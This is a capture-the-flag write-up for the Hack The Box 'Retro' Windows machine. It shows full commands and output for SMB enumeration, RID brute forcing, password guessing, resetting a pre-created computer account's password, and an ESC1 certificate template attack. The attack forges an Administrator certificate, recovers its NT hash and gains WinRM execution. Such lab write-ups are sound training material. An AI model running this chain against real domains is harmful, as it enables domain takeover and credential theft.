# Target
| Category          | Details                                               |
|-------------------|-------------------------------------------------------|
| 📝 **Name**       | [Retro](https://app.hackthebox.com/machines/Retro)    |  
| 🏷 **Type**       | HTB Machine                                           |
| 🖥 **OS**         | Windows                                               |
| 🎯 **Difficulty** | Easy                                                  |
| 📁 **Tags**       | Password Guessing, Pre-Created Computer Account, ECS1 |

# Scan
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-28 16:33:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-10-28T16:16:20
|_Not valid after:  2026-10-28T16:16:20
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-10-28T16:16:20
|_Not valid after:  2026-10-28T16:16:20
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-10-28T16:16:20
|_Not valid after:  2026-10-28T16:16:20
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-10-28T16:16:20
|_Not valid after:  2026-10-28T16:16:20
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-28T16:34:43+00:00; +25s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-28T16:34:03+00:00
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2025-10-27T16:25:29
|_Not valid after:  2026-04-28T16:25:29
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
54998/tcp open  msrpc         Microsoft Windows RPC
55017/tcp open  msrpc         Microsoft Windows RPC
59032/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
59041/tcp open  msrpc         Microsoft Windows RPC
62900/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 24s, deviation: 0s, median: 24s
| smb2-time: 
|   date: 2025-10-28T16:34:05
|_  start_date: N/A
```

# Attack path
1. [Gain access as `trainee` user by guessing it's password](#gain-access-as-trainee-user-by-guessing-its-password)
2. [Escalate to `BANKING$` user by guessing it's password](#escalate-to-banking-user-by-guessing-its-password)
3. [Escalate to `Administrator` user by exploiting ECS1 certificate template misconfiguration](#escalate-to-administrator-user-by-exploiting-ecs1-certificate-template-misconfiguration)

### Gain access as `trainee` user by guessing it's password

#### Add `retro.vl` and `dc.retro.vl` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ echo "$TARGET retro.vl dc.retro.vl" | sudo tee -a /etc/hosts
10.129.70.61 retro.vl dc.retro.vl
```

#### List SMB shares as `guest` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ smbmap -u guest -H $TARGET --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.70.61:445        Name: retro.vl                  Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Notes                                                   NO ACCESS
        SYSVOL                                                  NO ACCESS       Logon server share 
        Trainees                                                READ ONLY
[*] Closed 1 connections
```

#### Access `Important.txt` in `\\Trainees` share
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ smbclient -U guest% \\\\retro.vl\\Trainees
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 23 23:58:43 2023
  ..                                DHS        0  Wed Jun 11 16:17:10 2025
  Important.txt                       A      288  Mon Jul 24 00:00:13 2023

                4659711 blocks of size 4096. 1308545 blocks available
smb: \> get Important.txt 
getting file \Important.txt of size 288 as Important.txt (2.4 KiloBytes/sec) (average 2.4 KiloBytes/sec)
```

#### Discover that all trainees share account and thus password
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ cat Important.txt                                         
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

#### Brute force RIDs to list user accounts
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ crackmapexec smb retro.vl -u guest -p '' --rid-brute 10000
SMB         retro.vl        445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         retro.vl        445    DC               [+] retro.vl\guest: 
SMB         retro.vl        445    DC               [+] Brute forcing RIDs
SMB         retro.vl        445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         retro.vl        445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         retro.vl        445    DC               501: RETRO\Guest (SidTypeUser)
SMB         retro.vl        445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         retro.vl        445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         retro.vl        445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         retro.vl        445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         retro.vl        445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         retro.vl        445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         retro.vl        445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         retro.vl        445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         retro.vl        445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         retro.vl        445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         retro.vl        445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         retro.vl        445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         retro.vl        445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         retro.vl        445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         retro.vl        445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         retro.vl        445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         retro.vl        445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         retro.vl        445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         retro.vl        445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         retro.vl        445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         retro.vl        445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         retro.vl        445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         retro.vl        445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         retro.vl        445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         retro.vl        445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         retro.vl        445    DC               1109: RETRO\tblack (SidTypeUser)
```

#### Guess password for user `trainee`
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ crackmapexec smb retro.vl -u trainee -p trainee
SMB         retro.vl        445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         retro.vl        445    DC               [+] retro.vl\trainee:trainee 
```

#### List SMB shares as `trainee` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ smbmap -u trainee -p trainee -H $TARGET --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.70.61:445        Name: retro.vl                  Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Notes                                                   READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Trainees                                                READ ONLY
[*] Closed 1 connections 
```

#### Access `ToDo.txt` in `\\Notes` share
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ smbclient -U trainee%trainee \\\\retro.vl\\Notes
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Apr  9 05:12:49 2025
  ..                                DHS        0  Wed Jun 11 16:17:10 2025
  ToDo.txt                            A      248  Mon Jul 24 00:05:56 2023
  user.txt                            A       32  Wed Apr  9 05:13:01 2025

                4659711 blocks of size 4096. 1307685 blocks available
smb: \> get ToDo.txt
getting file \ToDo.txt of size 248 as ToDo.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

### Escalate to `BANKING$` user by guessing it's password

#### Discover that there is old pre created computer account for banking software on the target
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ cat ToDo.txt 
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

#### Guess password for `BANKING$` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ crackmapexec smb retro.vl -u 'BANKING$' -p banking
SMB         retro.vl        445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         retro.vl        445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

#### Change password for `BANKING$` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ impacket-changepasswd retro.vl/'BANKING$'@retro.vl -newpass pass -p rpc-samr
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Current password: 
[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.
```

### Escalate to `Administrator` user by exploiting ECS1 certificate template misconfiguration

#### List vulnerable certificates templates
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ certipy-ad find -u 'BANKING$'@retro.vl -p pass -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: RETRO.VL.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: DC.retro.vl.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'retro-DC-CA'
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1
```

#### Get `retro.vl` domain SID
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ rpcclient -U 'BANKING$%pass' retro.vl -c lsaquery  
Domain Name: RETRO
Domain Sid: S-1-5-21-2983547755-698260136-4283918172
```

#### Request certificate for `Administrator` user using ECS1 vulnerable template
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ certipy-ad req -u 'BANKING$'@retro.vl -dc-ip $TARGET -target dc.retro.vl -p pass -ca retro-DC-CA -template RetroClients -upn Administrator -key-size 4096 -sid 'S-1-5-21-2983547755-698260136-4283918172-500'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

#### Get NTLM hash using requested certificate
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ certipy-ad auth -pfx administrator.pfx -domain retro.vl -dc-ip $TARGET            
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

#### Confirm escalation
```
┌──(magicrc㉿perun)-[~/attack/HTB Retro]
└─$ crackmapexec winrm retro.vl -u administrator -H 252fac7066d93dd009d4fd2cd0368389 -x whoami
SMB         retro.vl        5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl)
HTTP        retro.vl        5985   DC               [*] http://retro.vl:5985/wsman
WINRM       retro.vl        5985   DC               [+] retro.vl\administrator:252fac7066d93dd009d4fd2cd0368389 (Pwn3d!)
WINRM       retro.vl        5985   DC               [+] Executed command
WINRM       retro.vl        5985   DC               retro\administrator
```
